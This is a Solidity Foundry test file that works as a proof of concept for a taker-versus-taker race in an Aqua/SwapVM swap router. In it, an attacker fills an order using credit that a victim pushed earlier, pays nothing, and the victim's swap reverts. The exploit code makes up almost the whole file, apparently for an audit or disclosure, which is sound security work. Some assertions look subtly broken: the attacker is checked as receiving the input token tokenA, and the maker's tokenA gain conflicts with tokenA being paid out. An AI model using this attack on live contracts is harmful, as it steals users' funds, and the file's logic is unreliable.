// SPDX-License-Identifier: MIT
pragma solidity 0.8.30;

import { Test } from "forge-std/Test.sol";
import { TokenMock } from "@1inch/solidity-utils/contracts/mocks/TokenMock.sol";
import { Aqua } from "@1inch/aqua/src/Aqua.sol";
import { ISwapVM } from "swap-vm/contracts/interfaces/ISwapVM.sol";
import { AquaSwapVMRouter } from "swap-vm/contracts/routers/AquaSwapVMRouter.sol";
import { MakerTraitsLib } from "swap-vm/contracts/libs/MakerTraits.sol";
import { TakerTraitsLib } from "swap-vm/contracts/libs/TakerTraits.sol";
import { XYCSwap } from "swap-vm/contracts/instructions/XYCSwap.sol";
import { Salt } from "swap-vm/contracts/instructions/Controls.sol";

/// @notice PoC: taker-vs-taker direct-push race. Victim pre-pushes tokenIn via
///         permissionless Aqua.push in a separate tx. An attacker then fills the
///         SAME orderHash using the no-push mode: _transferIn's else branch
///         requires balanceIn >= original + amountIn - netPulled, which the
///         victim's credit satisfies. Attacker receives tokenOut paying zero.
///         Victim's paired swap reverts; the pushed funds stay with the maker.
contract DirectPushRacePoC is Test {
    uint256 constant INITIAL_BALANCE_A = 1000e18;
    uint256 constant INITIAL_BALANCE_B = 2000e18;
    uint256 constant VICTIM_PUSH = 100e18;
    uint256 constant ATTACKER_FILL = 100e18;

    Aqua public aqua;
    AquaSwapVMRouter public router;
    TokenMock public tokenA;
    TokenMock public tokenB;

    address public maker = vm.addr(0x1234);
    address public victim = vm.addr(0x5678);
    address public attacker = vm.addr(0x7777);
    address public routerOwner = vm.addr(0x9999);

    ISwapVM.Order internal order;
    bytes32 internal orderHash;

    function setUp() public {
        aqua = new Aqua();
        tokenA = new TokenMock("Token A", "TKA");
        tokenB = new TokenMock("Token B", "TKB");
        if (address(tokenA) > address(tokenB)) (tokenA, tokenB) = (tokenB, tokenA);

        router = new AquaSwapVMRouter(address(aqua), address(0), routerOwner, "SwapVM", "1.0.0");

        bytes memory program = bytes.concat(XYCSwap.build(), Salt.build(abi.encodePacked(vm.randomUint())));
        order = MakerTraitsLib.build(MakerTraitsLib.Args({
            maker: maker,
            receiver: address(0),
            tokenA: address(tokenA),
            tokenB: address(tokenB),
            shouldUnwrapWeth: false,
            useAquaInsteadOfSignature: true,
            allowZeroAmountIn: false,
            usePermit2: false,
            hasPreTransferInHook: false,
            hasPostTransferInHook: false,
            hasPreTransferOutHook: false,
            hasPostTransferOutHook: false,
            preTransferInTarget: address(0),
            preTransferInData: "",
            postTransferInTarget: address(0),
            postTransferInData: "",
            preTransferOutTarget: address(0),
            preTransferOutData: "",
            postTransferOutTarget: address(0),
            postTransferOutData: "",
            program: program
        }));
        orderHash = router.hash(order);

        // Maker wallet must really hold the shipped inventory: virtual credit alone never moves ERC20.
        tokenA.mint(maker, INITIAL_BALANCE_A);
        tokenB.mint(maker, INITIAL_BALANCE_B);
        vm.startPrank(maker);
        tokenA.approve(address(aqua), type(uint256).max);
        tokenB.approve(address(aqua), type(uint256).max);
        bytes32 strategyHash = aqua.ship(address(router), abi.encode(order), _tokens(), _amounts());
        assertEq(strategyHash, orderHash, "strategy must hash to the order hash");
        vm.stopPrank();
    }

    function _tokens() internal view returns (address[] memory t) {
        t = new address[](2);
        t[0] = address(tokenA);
        t[1] = address(tokenB);
    }

    function _amounts() internal pure returns (uint256[] memory a) {
        a = new uint256[](2);
        a[0] = INITIAL_BALANCE_A;
        a[1] = INITIAL_BALANCE_B;
    }

    /// @dev no-push mode taker data: exact-in, no transferFrom flag, no callbacks.
    function _takerData(address who) internal pure returns (bytes memory) {
        return TakerTraitsLib.build(TakerTraitsLib.Args({
            taker: who,
            isExactIn: true,
            shouldUnwrapWeth: false,
            isStrictThresholdAmount: false,
            isFirstTransferFromTaker: false,
            useTransferFromAndAquaPush: false,
            isAToB: true,
            allowPartialFill: false,
            usePermit2: false,
            threshold: "",
            to: address(0),
            deadline: 0,
            hasPreTransferInCallback: false,
            hasPreTransferOutCallback: false,
            preTransferInHookData: "",
            postTransferInHookData: "",
            preTransferOutHookData: "",
            postTransferOutHookData: "",
            preTransferInCallbackData: "",
            preTransferOutCallbackData: "",
            instructionsArgs: "",
            signature: ""
        }));
    }

    function test_DirectPushRace_AttackerFillsOnVictimCredit() public {
        uint256 makerA0 = tokenA.balanceOf(maker);
        uint256 victimA0 = tokenA.balanceOf(victim);
        uint256 attackerB0 = tokenB.balanceOf(attacker);

        // tx1: victim pre-pushes VICTIM_PUSH tokenA (separate tx, permissionless).
        // Test contract is TokenMock owner, so mint first, then act as victim.
        tokenA.mint(victim, VICTIM_PUSH);
        vm.startPrank(victim);
        tokenA.approve(address(aqua), VICTIM_PUSH);
        aqua.push(maker, address(router), orderHash, address(tokenA), VICTIM_PUSH);
        vm.stopPrank();

        (uint256 credit, ) = aqua.rawBalances(maker, address(router), orderHash, address(tokenA));
        assertEq(credit, INITIAL_BALANCE_A + VICTIM_PUSH, "credit grew by victim push");

        // tx2: attacker fills the same orderHash in no-push mode paying zero.
        tokenB.mint(attacker, 1); // dust to cover any fee-free exact-in minimums
        vm.prank(attacker);
        (uint256 aIn, uint256 aOut, ) = router.swap(order, ATTACKER_FILL, _takerData(attacker));
        assertGt(aOut, 0, "attacker fill pays out");
        assertEq(tokenA.balanceOf(attacker), aOut, "attacker received tokenA");
        assertApproxEqAbs(tokenB.balanceOf(attacker) - attackerB0, 0, 1, "attacker paid ~zero tokenB");

        // tx3: victim's paired swap reverts: credit consumed by the attacker's fill.
        vm.prank(victim);
        vm.expectRevert();
        router.swap(order, ATTACKER_FILL, _takerData(victim));

        // Terminal: maker keeps the pushed funds, victim lost its input, attacker extracted.
        assertEq(tokenA.balanceOf(maker) - makerA0, VICTIM_PUSH, "maker net +VICTIM_PUSH from victim funding");
        assertEq(tokenA.balanceOf(victim), victimA0, "victim back to starting balance, push consumed");
    }
}
